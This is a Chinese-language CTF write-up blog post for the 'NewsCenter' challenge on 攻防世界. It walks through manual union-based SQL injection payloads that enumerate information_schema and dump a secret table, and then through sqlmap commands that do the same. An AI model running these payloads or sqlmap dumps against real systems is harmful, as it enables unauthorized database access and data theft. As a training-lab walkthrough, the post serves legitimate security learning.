---
layout:     post               # 使用的布局（不需要改）
title:      NewsCenter     # 标题 
subtitle:    攻防世界   #副标题
date:       2020-07-13         # 时间
author:     yanmie             # 作者
header-img: img/.jpg    ##标签这篇文章标题背景图片
catalog: true                       # 是否归档
tags:                               
    - CTF
  
---


打开环境，像是一个新闻搜索网站。

![UY6z3q.png](https://s1.ax1x.com/2020/07/13/UY6z3q.png)

看到一个输入框想到`xss`或者`sql注入`。

xss无果，尝试sql注入。

## 手工注入

输入`hack'`，页面直接返回空白页，太不正常了，

这里时post提交数据，在输入`hack' #`,页面反正正常了。

![UYcHR1.png](https://s1.ax1x.com/2020/07/13/UYcHR1.png)

说明存在`sql注入`。

`hack' order by 4 #`页面返回空白，`hack' order by 3 #`页面返回正常，判断字段数为3.

判断回显，`hack' union select 1,2,3 #`

![UYg1yV.png](https://s1.ax1x.com/2020/07/13/UYg1yV.png)

爆出数据库 `hack' union select 1,version(),database() #`

![UYgNFJ.png](https://s1.ax1x.com/2020/07/13/UYgNFJ.png)

爆出表 `hack' union select 1,version(),group_concat(table_name) from information_schema.tables where table_schema=database() #`。发现有个表可疑`secret_table `

![UYgRfA.png](https://s1.ax1x.com/2020/07/13/UYgRfA.png)

爆出可以表的字段 `hack' union select 1,version(),group_concat(column_name) from information_schema.columns where table_name='secret_table' #`

![UYgbkQ.png](https://s1.ax1x.com/2020/07/13/UYgbkQ.png)

爆出内容。 `hack' union select 1,version(),group_concat(id,fl4g) from secret_table #`

![UY2Fh9.png](https://s1.ax1x.com/2020/07/13/UY2Fh9.png)

成功得到flag.

## sqlmap注入

这里再用sqlmap练习跑一下子。

将抓到的post包保存为`hack.txt`，

![UY2tnf.png](https://s1.ax1x.com/2020/07/13/UY2tnf.png)

`python2 sqlmap.py -r .\..\hack.txt`先进行一波分析吧。

![UYRIIg.png](https://s1.ax1x.com/2020/07/13/UYRIIg.png)

我们可以看到sqlmap给我们抛出了好多有用的信息。

他告诉我们可以进行布尔盲注、联合查询、时间盲注、联合查询，并且给了我们对应的payload.

`python2 sqlmap.py -r .\..\hack.txt --dbs`跑一跑数据库

![UYWfp9.png](https://s1.ax1x.com/2020/07/13/UYWfp9.png)

`python2 sqlmap.py -r .\..\hack.txt -D news --tables`跑一跑news数据库的表。

![UYWxXt.png](https://s1.ax1x.com/2020/07/13/UYWxXt.png)

`python2 sqlmap.py -r .\..\hack.txt -D news -T secret_table --columns`跑一跑字段

![UYf39J.png](https://s1.ax1x.com/2020/07/13/UYf39J.png)

`python2 sqlmap.py -r .\..\hack.txt -D news -T secret_table -C fl4g --dump`跑内容

![UYhMrt.png](https://s1.ax1x.com/2020/07/13/UYhMrt.png)